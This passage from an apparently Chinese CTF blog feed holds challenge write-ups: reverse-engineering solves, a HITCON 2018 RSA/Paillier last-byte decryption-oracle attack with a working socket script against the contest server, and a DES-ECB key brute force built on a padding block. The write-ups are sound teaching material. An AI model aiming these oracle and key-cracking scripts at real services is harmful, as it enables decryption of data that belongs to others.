<span class="number">0x58</span>, <span class="number">0xB5</span>, <span class="number">0x61</span>,</span><br><span class="line">      <span class="number">0x8E</span>, <span class="number">0x36</span>, <span class="number">0xAC</span>, <span class="number">0x09</span>, <span class="number">0x59</span>, <span class="number">0xE5</span>,</span><br><span class="line">      <span class="number">0x61</span>, <span class="number">0xDD</span>, <span class="number">0x3E</span>, <span class="number">0x3F</span>, <span class="number">0xB9</span>, <span class="number">0x15</span>,</span><br><span class="line">      <span class="number">0xED</span>, <span class="number">0xD5</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(num1)<span class="number">-1</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">        num1[j]=num1[j<span class="number">-1</span>]^num1[j]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(num1)):</span><br><span class="line">    flag1+=chr((num1[i]^i)&gt;&gt;<span class="number">2</span>|(((num1[i]^i)&lt;&lt;<span class="number">6</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line"><span class="keyword">print</span> flag1</span><br><span class="line"><span class="comment">#flag&#123;W0w_y0u_m4st3r_C_p1us_p1us&#125;</span></span><br></pre></td></tr></table></figure><h4 id="What-is-it"><a href="#What-is-it" class="headerlink" title="What is it"></a>What is it</h4><p>先爆破 md5：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crackMd5</span><span class="params">()</span>:</span></span><br><span class="line">product = itertools.permutations(string.letters[:<span class="number">26</span>],<span class="number">6</span>)</span><br><span class="line"><span class="keyword">for</span> test <span class="keyword">in</span> product:</span><br><span class="line">md5_test = md5(<span class="string">""</span>.join(test)).hexdigest()</span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span>.join(test)</span><br><span class="line">var1 = <span class="number">0</span></span><br><span class="line">var2 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(md5_test)):</span><br><span class="line"><span class="keyword">if</span> md5_test[i]==<span class="string">'0'</span>:</span><br><span class="line">var1 += <span class="number">1</span></span><br><span class="line">var2 += i</span><br><span class="line"><span class="keyword">if</span> <span class="number">10</span>*var1 + var2 == <span class="number">0x193</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"ans : "</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span>.join(test)</span><br><span class="line"><span class="keyword">print</span> md5_test</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"failed!"</span></span><br><span class="line"></span><br><span class="line">crackMd5()</span><br></pre></td></tr></table></figure><p>ozulmt 这是跑出的字符串，然后动态调试可以在内存中直接看到 flag,不过要加上格式，根据checkht加上就好.</p><blockquote><p>flag{a197b847-7092-53a4-7c41-bc7d6d52e69d} </p></blockquote><h4 id="Cyvm"><a href="#Cyvm" class="headerlink" title="Cyvm"></a>Cyvm</h4><p>虚拟机逆向，直接 Angr 跑。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">'cyvm'</span>)</span><br><span class="line"></span><br><span class="line">flag_chars = [claripy.BVS(<span class="string">'flag_%d'</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>)]</span><br><span class="line">flag = claripy.Concat(*flag_chars + [claripy.BVV(<span class="string">b'\n'</span>)])</span><br><span class="line">st = p.factory.blank_state(addr=<span class="number">0x400CB1</span>,stdin=flag)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> flag_chars:</span><br><span class="line">    st.solver.add(k &gt;= <span class="number">32</span>)</span><br><span class="line">    st.solver.add(k &lt;= <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line">st.solver.add(flag_chars[<span class="number">0</span>] == <span class="string">'f'</span>)</span><br><span class="line">st.solver.add(flag_chars[<span class="number">1</span>] == <span class="string">'l'</span>)</span><br><span class="line">st.solver.add(flag_chars[<span class="number">2</span>] == <span class="string">'a'</span>)</span><br><span class="line">st.solver.add(flag_chars[<span class="number">3</span>] == <span class="string">'g'</span>)</span><br><span class="line">st.solver.add(flag_chars[<span class="number">4</span>] == <span class="string">'&#123;'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(st)</span><br><span class="line">sm.explore(find=<span class="number">0x400CD2</span>)</span><br><span class="line"></span><br><span class="line">found = sm.found[<span class="number">0</span>]</span><br><span class="line">solution = found.solver.eval(flag, cast_to=str)</span><br><span class="line"><span class="keyword">print</span> solution</span><br></pre></td></tr></table></figure><blockquote><p>flag{7h15_15_MY_f1rs7_s1mpl3_Vm} </p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Web 感觉有些脑洞的东西，Crypto 的题都要写脚本，socket 感觉有点难用，要转 pwntools 了….</p><p>做出 Misc 的都是带哥。 </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 HITCON Crypto lost key</title>
      <link href="/2018/10/24/2018-HITCON-Crypto-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
      <url>/2018/10/24/2018-HITCON-Crypto-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="lost-key"><a href="#lost-key" class="headerlink" title="lost key"></a>lost key</h3><p>赛后学习了一下这道密码题的攻击姿势。</p><p>题目脚本如下：</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys,os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys.stdin  = os.fdopen(sys.stdin.fileno(), <span class="string">'r'</span>, <span class="number">0</span>)</span><br><span class="line">sys.stdout = os.fdopen(sys.stdout.fileno(), <span class="string">'w'</span>, <span class="number">0</span>)</span><br><span class="line">rnd = SystemRandom()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcA</span><span class="params">(g,n,data)</span>:</span></span><br><span class="line">  num = bytes_to_long(data)</span><br><span class="line">  res = pow(g,num,n*n)</span><br><span class="line">  r = rnd.randint(<span class="number">0</span>,n<span class="number">-1</span>)</span><br><span class="line">  magic = pow(r,n,n*n)</span><br><span class="line">  res = (res*magic)%(n*n)</span><br><span class="line">  <span class="keyword">return</span> long_to_bytes(res).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcB</span><span class="params">(phi,n,u,data)</span>:</span></span><br><span class="line">  num = bytes_to_long(data)</span><br><span class="line">  res = pow(num,phi,n*n)</span><br><span class="line">  res = (res - <span class="number">1</span>)/n</span><br><span class="line">  res = (res*u)%n</span><br><span class="line">  <span class="keyword">return</span> long_to_bytes(res).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  p = getPrime(<span class="number">512</span>)</span><br><span class="line">  q = getPrime(<span class="number">512</span>)</span><br><span class="line">  n = p*q</span><br><span class="line">  phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">  g = n+<span class="number">1</span></span><br><span class="line">  u = invert(phi,n)</span><br><span class="line">  flag = open(<span class="string">'flag'</span>).read()</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'Here is the flag!'</span></span><br><span class="line">  <span class="keyword">print</span> calcA(g,n,flag)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2048</span>):</span><br><span class="line">    m = raw_input(<span class="string">'cmd: '</span>)</span><br><span class="line">    <span class="keyword">if</span> m[<span class="number">0</span>] == <span class="string">'A'</span>:</span><br><span class="line">      m = raw_input(<span class="string">'input: '</span>)</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">        m = m.decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">print</span> calcA(g,n,m)</span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'no'</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> m[<span class="number">0</span>] == <span class="string">'B'</span>:</span><br><span class="line">      m = raw_input(<span class="string">'input: '</span>)</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">        m = m.decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">print</span> calcB(phi,n,u,m)[<span class="number">-2</span>:]</span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'no'</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>服务器随机生成 RSA 中的 n 和 e，并将 flag 的密文发给我们。服务器提供了两个服务：对于我们给出的明文服务器返回密文；对于我们给出的密文返回解密后的明文最后一个字节。</p><p>这个题考点有两个：获取公钥和 LSB Oracle Attrack。</p><h4 id="获取公钥"><a href="#获取公钥" class="headerlink" title="获取公钥"></a>获取公钥</h4><p>首先我们需要获得公钥，这里可以通过选择明文攻击的典型手法获取 n，原理大致如下：</p><p>我们首先发送 2 让服务器进行加密，返回 <strong>c1=2<sup>e</sup> mod n</strong><br>继续发送 2**2，也就是 4，让服务器进行加密，返回 <strong>c2=4<sup>e</sup> mod n</strong><br>我们有：<strong>c1<sup>2</sup>-c2=kn</strong></p><p>为什么呢？不妨设 2<sup>e</sup>=a+bn,我们有 <strong>c1=(a+bn)mod n=a</strong>,同时 <strong>c2=(a<sup>2</sup>+2abn+b<sup>2</sup>n<sup>2</sup>)mod n =a<sup>2</sup> mod n</strong>,所以 c1<sup>2</sup> 和 c2 模 n 同余。</p><p>一般来说 a<sup>2</sup> 会比 n 大，所以 k 不为 0。</p><p>同理我们分别发送 3 和 9，用同样的方法得到了 n 的又一个倍数,计算他们的公因数，这样大概率得到的就是 n。</p><p>为了准确我们也可以多发送几组，取他们的公因数。</p><h4 id="获取-flag"><a href="#获取-flag" class="headerlink" title="获取 flag"></a>获取 flag</h4><p>得到了 n,我们就可以获取 flag 了。这个题提供的解密返回解密结果的最后一个字节，很像之前 Xman 选拔赛出国的经典的 LSB Oracle Attrack（不了解的可以看一下<a href="https://xz.aliyun.com/t/2446#toc-27" target="_blank" rel="noopener"> 这篇 </a>以及<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_3" target="_blank" rel="noopener"> ctf-wiki 的相关推导 </a>）</p><p>之前的是给我们最后一个 bit 的值，也就是对应明文的奇偶，现在给我们的不仅仅是 1 bit 而是 8 bit。</p><p>如果我们考虑用同样的方法，即浪费他给的那 7 个 bit，我们会发现由于 n 是 1024 位，采用二分逼近需要 1024 次，题目连接一次只提供 150 次交互，显然条件不能浪费。</p><p>给了我们最后一字节，我们也可以采用利用最后 1bit 攻击类似的手法，详细的推导过程 iromise 师傅已经在 <a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_5" target="_blank" rel="noopener">ctf-wiki 相关部分</a>中写的很详细了。</p><p>下面是 exp:(我用的是 socket，pwn 师傅们可能习惯用 pwntools，可以参考 wiki 里的脚本)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>  bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">"18.179.251.168"</span>, <span class="number">21700</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(data)</span>:</span>  <span class="comment">#加密</span></span><br><span class="line">    s.send(<span class="string">"A"</span>+<span class="string">"\n"</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    s.send(long_to_bytes(data).encode(<span class="string">"hex"</span>)+<span class="string">"\n"</span>)</span><br><span class="line">    result=s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> bytes_to_long(result.decode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(data)</span>:</span>  <span class="comment">#解密</span></span><br><span class="line">    s.send(<span class="string">"B"</span> + <span class="string">"\n"</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    s.send(long_to_bytes(data).encode(<span class="string">"hex"</span>) + <span class="string">"\n"</span>)</span><br><span class="line">    result = s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> bytes_to_long(result.decode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_pubkey</span><span class="params">()</span>:</span> <span class="comment">#获取公钥 n</span></span><br><span class="line">    two = enc(<span class="number">2</span>)</span><br><span class="line">    three = enc(<span class="number">3</span>)</span><br><span class="line">    power_two = enc(<span class="number">2</span>**<span class="number">2</span>)</span><br><span class="line">    power_three = enc(<span class="number">3</span>**<span class="number">2</span>)</span><br><span class="line">    n = gmpy2.gcd(two ** <span class="number">2</span> - power_two, three ** <span class="number">2</span> - power_three)</span><br><span class="line">    <span class="keyword">while</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        n = n / <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> n % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        n = n / <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_flag</span><span class="params">(flagcipher,n)</span>:</span> <span class="comment">#获取 flag</span></span><br><span class="line">    submap = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        submap[-n * i % <span class="number">256</span>] = i</span><br><span class="line">    cipher256 = enc(<span class="number">256</span>)</span><br><span class="line">    last_bytes=dec(flagcipher)</span><br><span class="line">    L = Fraction(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    R = Fraction(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">        flagcipher = flagcipher * cipher256 % n</span><br><span class="line">        b=dec(flagcipher)</span><br><span class="line">        k = submap[b]</span><br><span class="line">        L, R = L + (R - L) * Fraction(k, <span class="number">256</span>), L + (R - L) * Fraction(k + <span class="number">1</span>, <span class="number">256</span>)</span><br><span class="line">    low = int(L * n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(low - low % <span class="number">256</span> +last_bytes)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    data=s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line">    flagcipher = bytes_to_long(re.findall(<span class="string">'\s*(.*)\s*cmd:'</span>, data)[<span class="number">0</span>].decode(<span class="string">"hex"</span>))</span><br><span class="line">    n=recover_pubkey()</span><br><span class="line">    <span class="keyword">print</span> n</span><br><span class="line">    <span class="keyword">print</span> recover_flag(flagcipher,n)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><blockquote><p>hitcon{1east_4ign1f1cant_BYTE_0racle_is_m0re_pow3rfu1!}</p></blockquote><p>参考：</p><ol><li><p><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_chosen_plain_cipher" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_chosen_plain_cipher</a></p></li><li><p><a href="https://github.com/p4-team/ctf/tree/master/2018-10-20-hitcon/crypto_rsa" target="_blank" rel="noopener">https://github.com/p4-team/ctf/tree/master/2018-10-20-hitcon/crypto_rsa</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 HITCON On my Raddit</title>
      <link href="/2018/10/22/2018-HITCON-On-my-Raddit/"/>
      <url>/2018/10/22/2018-HITCON-On-my-Raddit/</url>
      
        <content type="html"><![CDATA[<h4 id="On-my-Raddit"><a href="#On-my-Raddit" class="headerlink" title="On my Raddit"></a>On my Raddit</h4><p>orange 大大出的这个题与其放在 Web 里，不如放在 Crypto 里。这里说一下比赛时的思路。</p><p>打开题目：</p><a id="more"></a><p><img src="https://upload-images.jianshu.io/upload_images/9223743-1012ea08b7efd242.png" alt="image.png"></p><p>flag 是加密密钥，而 <code>hint</code> 提示加密密钥是<code>小写字母</code>。还有一个<code>P</code>的提示。</p><p>查看一波源码：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-fc4e4502d0d39934.png" alt="image.png"></p><p>可以看到都是<code>?s=密文</code>的形式。网页提供了一个页面显示多少文章的选项，我们关注一下这块的源码：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-71fe7a9f371ffff9.png" alt="image.png"></p><p>可以看到两个密文前 64bit是一样的，后 64bit 不同，可以推断 64 bit 应该是一个分组，而且明文应该是<code>salt+number</code>的形式，salt 相同导致第一段密文相同。</p><p>接着我开始分析下面的链接的密文，起初我的想法是分析密文长度，根据密文长度和文章名的长度来推测 salt 的格式（文章名字越长密文越长），但是这个 salt 格式推了半天发现也没有卵用。</p><p>这个题不同于一般的密码题，一般都是要还原明文，这里 flag 是密钥，知道了明文也没用。</p><p>陷入了瓶颈，想找源码泄露找不到，扫一波目录还把我 ip ban了一会…</p><p>可用信息看来就这么多。想起提示密钥是小写字母，无疑缩小范围。如果不给这个提示，<code>2^56</code>我绝对爆破不出来，既然给了这个提示，所以我的思路就是爆破。</p><p>通过分组长度是 64bit可以推测加密算法应该是 DES，常用的应该也就 DES 分块是 64 bit。接下来需要找到明密文对，我源代码里搜寻了一下 limit=10 的链接密文后 64bit：<strong>3ca92540eb2d0a42</strong> 结果发现了点东西：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a99b6f71b4b6d31d.png" alt="image.png"></p><p>发现竟然有 18 处这个密文！ 仔细观察发现都在末尾！！</p><p>豁然开朗，看来这是 ECB 模式的 DES，这么多相同的密文绝不是巧合，一定是相同的明文。相同的明文都在而且都在最后，显然是 Padding 的时候，如果明文长度正好是分块的长度。假设分块长度是 8 字节，那么这种情况下会补8个<code>08</code>字节。详细的请看下<code>PKCS5</code>填充规则。想起了提示 P 应该就是提示 Padding 。</p><p>这八个 08 字节加密的密文都是 3ca92540eb2d0a42，所以有 18 处这块密文。</p><p>找到了明密文对，直接开始爆破的话，那就是<code>26^8</code>,我计算了一下是 <code>2^38</code>，我觉得是爆不出来…</p><p>想到了 DES 实际可用的密钥只有 56 bit，比如第一个字节是’b’，那么密钥前八位是 <code>01100010</code>，注意这里最后一位的 0 没有作用，在 DES 中每个字节的最后一位时被丢弃的，也就是说第一个字节用 b 加密和用 c 加密没有区别。</p><p>这样的话，b 和 c 效果一样，d 和 e 效果一样，也就是我们只需要<code>13^8==2^30</code>步就可以遍历完，直接爆破：</p><p>(脚本很丑，而且单线程)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line">list=<span class="string">"acegikmoqsuwy"</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> list:</span><br><span class="line">    key1 = a</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> list:</span><br><span class="line">        key2 = key1 + b</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> list:</span><br><span class="line">            key3 = key2 + c</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> list:</span><br><span class="line">                key4 = key3 + d</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> list:</span><br><span class="line">                    key5 = key4 + e</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> list:</span><br><span class="line">                        key6 = key5 + f</span><br><span class="line">                        <span class="keyword">for</span> g <span class="keyword">in</span> list:</span><br><span class="line">                            key7 = key6 + g</span><br><span class="line">                            <span class="keyword">for</span> h <span class="keyword">in</span> list:</span><br><span class="line">                                key = key7 + h</span><br><span class="line">                                <span class="keyword">print</span> key</span><br><span class="line">                                obj = DES.new(key)</span><br><span class="line">                                <span class="keyword">if</span> obj.decrypt(<span class="string">"3ca92540eb2d0a42"</span>.decode(<span class="string">"hex"</span>))==<span class="string">"0808080808080808"</span>.decode(<span class="string">"hex"</span>):</span><br><span class="line">                                    <span class="keyword">print</span> key</span><br><span class="line">                                    exit()</span><br></pre></td></tr></table></figure><p>5 点多开始跑，跑到8点多结束了… 打印出来的 key 是：<code>megooaso</code>,注意这不是真正的密钥，除去 a，剩下的都有和它相邻字符等价效果的，没办法我想把所以字符串打出来，看看哪个像个单词：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="string">"lm"</span>:</span><br><span class="line">    key1 = a</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">"de"</span>:</span><br><span class="line">        key2 = key1 + b</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">"fg"</span>:</span><br><span class="line">            key3 = key2 + c</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="string">"no"</span>:</span><br><span class="line">                key4 = key3 + d</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> <span class="string">"no"</span>:</span><br><span class="line">                    key5 = key4 + e</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="string">"a"</span>:</span><br><span class="line">                        key6 = key5 + f</span><br><span class="line">                        <span class="keyword">for</span> g <span class="keyword">in</span> <span class="string">"rs"</span>:</span><br><span class="line">                            key7 = key6 + g</span><br><span class="line">                            <span class="keyword">for</span> h <span class="keyword">in</span> <span class="string">"no"</span>:</span><br><span class="line">                                key = key7 + h</span><br><span class="line">                                <span class="keyword">print</span> key</span><br></pre></td></tr></table></figure><p>挨个看发现没有像单词的… l 开头的应该不是，m 开头的试了试，最终<code>megnnaro</code>是 flag。</p><blockquote><p>hitcon{megnnaro}</p></blockquote><p>另外看了 orange 的解答才发现用 hashcat 秒解… 但是我的 hashcat 不知怎么回事用不了，照着师傅们的命令执行都不行orz。有成功使用 hashcat 解出来的师傅可以联系一下我给我指点一波…还有的师傅找到了别的明密文对，只能说 tql ，对着这一大串能猜出另外的明密文对。 orange 题解中说用 python 单线程 10 min跑完，不知道这个 10 min 怎么来的…我跑了快三个小时。</p><p>这个题的第二关 On my Raddit V2 题目说是 getshell，一样的环境。有了密钥我就可以把那些密文都解出来，解出来那些只是些没有用的东西:<br><code>u=70c97cc1-079f-4d01-8798-f36925ec1fd7&amp;m=r&amp;t=Ghostbuster%3A+Detecting+the+Presence+of+Hidden+Eavesdroppers+%5Bpdf%5D</code></p><p>不过题目有个下载文件的地方：</p><p><img 